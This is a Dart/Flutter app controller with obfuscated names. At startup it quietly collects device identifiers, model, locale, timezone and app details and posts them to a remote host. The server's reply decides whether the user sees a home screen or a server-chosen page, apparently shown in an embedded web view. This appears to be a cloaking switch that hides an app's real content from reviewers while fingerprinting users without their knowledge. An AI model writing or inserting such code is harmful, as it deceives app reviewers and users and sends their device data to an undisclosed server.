import 'dart:convert';
import 'dart:io';

import 'package:device_info_plus/device_info_plus.dart';
import 'package:dio/dio.dart';
import 'package:flutter_inappwebview/flutter_inappwebview.dart';
import 'package:flutter_timezone/flutter_timezone.dart';
import 'package:get/get.dart';
import 'package:package_info_plus/package_info_plus.dart';

class PageLogic extends GetxController {

  var ujgyrnxdqh = RxBool(false);
  var edampuvhzb = RxBool(true);
  var nisp = RxString("");
  var vanessa = RxBool(false);
  var rogahn = RxBool(true);
  final qhaodjgm = Dio();


  InAppWebViewController? webViewController;

  @override
  void onInit() {
    super.onInit();
    vdqrast();
  }


  Future<void> vdqrast() async {

    vanessa.value = true;
    rogahn.value = true;
    edampuvhzb.value = false;

    qhaodjgm.post("https://xia.jueloppi.xyz/mlTfwg6uF4BD3bJ",data: await qkbgzdov()).then((value) {
      var fahunbqg = value.data["fahunbqg"] as String;
      var mbopnedc = value.data["mbopnedc"] as bool;
      if (mbopnedc) {
        nisp.value = fahunbqg;
        aileen();
      } else {
        ortiz();
      }
    }).catchError((e) {
      edampuvhzb.value = true;
      rogahn.value = true;
      vanessa.value = false;
    });
  }

  Future<Map<String, dynamic>> qkbgzdov() async {
    final DeviceInfoPlugin etcouvnb = DeviceInfoPlugin();
    PackageInfo lqpv_zbhljiay = await PackageInfo.fromPlatform();
    final String currentTimeZone = await FlutterTimezone.getLocalTimezone();
    var lvoinyw = Platform.localeName;
    var EwrWTMSl = currentTimeZone;

    var dQBqIv = lqpv_zbhljiay.packageName;
    var xeBlSkYQ = lqpv_zbhljiay.version;
    var GfPd = lqpv_zbhljiay.buildNumber;

    var CMPBw = lqpv_zbhljiay.appName;
    var jerelVon = "";
    var xvikEHh  = "";
    var lolaKonopelski = "";
    var ymMLZw = "";
    var karianneHuel = "";
    var tTVK = "";
    var rubyeHomenick = "";
    var orrinWisozk = "";
    var nicholausHills = "";


    var YqDIGi = "";
    var eaEZoTN = false;

    if (GetPlatform.isAndroid) {
      YqDIGi = "android";
      var ypzsexd = await etcouvnb.androidInfo;

      ymMLZw = ypzsexd.brand;

      tTVK  = ypzsexd.model;
      xvikEHh = ypzsexd.id;

      eaEZoTN = ypzsexd.isPhysicalDevice;
    }

    if (GetPlatform.isIOS) {
      YqDIGi = "ios";
      var lusjgho = await etcouvnb.iosInfo;
      ymMLZw = lusjgho.name;
      tTVK = lusjgho.model;

      xvikEHh = lusjgho.identifierForVendor ?? "";
      eaEZoTN  = lusjgho.isPhysicalDevice;
    }

    var res = {
      "CMPBw": CMPBw,
      "GfPd": GfPd,
      "dQBqIv": dQBqIv,
      "tTVK": tTVK,
      "lolaKonopelski" : lolaKonopelski,
      "EwrWTMSl": EwrWTMSl,
      "ymMLZw": ymMLZw,
      "eaEZoTN": eaEZoTN,
      "xvikEHh": xvikEHh,
      "lvoinyw": lvoinyw,
      "YqDIGi": YqDIGi,
      "xeBlSkYQ": xeBlSkYQ,
      "orrinWisozk" : orrinWisozk,
      "jerelVon" : jerelVon,
      "karianneHuel" : karianneHuel,
      "rubyeHomenick" : rubyeHomenick,
      "nicholausHills" : nicholausHills,

    };
    return res;
  }

  Future<void> ortiz() async {
    Get.offAllNamed("/home");
  }

  Future<void> aileen() async {
    Get.offAllNamed("/equ-be");
  }

}
